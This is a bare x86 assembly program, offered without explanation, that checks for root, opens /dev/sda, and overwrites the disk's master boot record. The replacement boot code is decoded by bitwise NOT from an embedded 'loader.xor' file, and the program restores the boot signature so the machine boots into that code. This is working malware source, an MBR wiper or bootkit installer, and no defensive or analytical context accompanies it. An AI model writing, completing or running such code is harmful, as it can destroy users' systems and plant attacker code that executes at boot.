extern open
extern read
extern write
extern lseek
extern close
extern getuid
extern exit

global _start
section .text

_start:
  call check_root
  call modify_mbr
  call abort

modify_mbr:
  sub esp, 0x200
  mov ebp, esp
  mov ebx, path_sda
  ; open("/dev/sda", O_RDWR)
  push 2
  push ebx
  call open
  cmp eax, 0
  js abort
  ; read(fd, buf, 0x200)
  mov ebx, eax
  push 0x200
  push ebp
  push ebx
  call read
  cmp eax, 0x200
  jnz abort
  ; crash_mbr(buf)
  push ebp
  call crash_mbr
  ; lseek(fd, 0, 0)
  xor edx, edx
  push edx
  push edx
  push ebx
  call lseek
  push 0x200
  push ebp
  push ebx
  call write
  push ebx
  call close
  add esp, 0x234
  ret

crash_mbr:
  mov edi, [esp+4]
  mov esi, new_mbr
  mov ecx, 448
  cld
  .@Loop:
  lodsb
  not al
  stosb
  dec ecx
  test ecx, ecx
  jnz .@Loop
  mov word [edi+0x3e], 0xaa55
  ret

check_root:
  call getuid
  test eax, eax
  jnz abort
  ret
  
abort:
  xor ebx, ebx
  push ebx
  call exit

section .data
path_sda:
  db "/dev/sda", 0
new_mbr:
  incbin "loader.xor", 0, 448
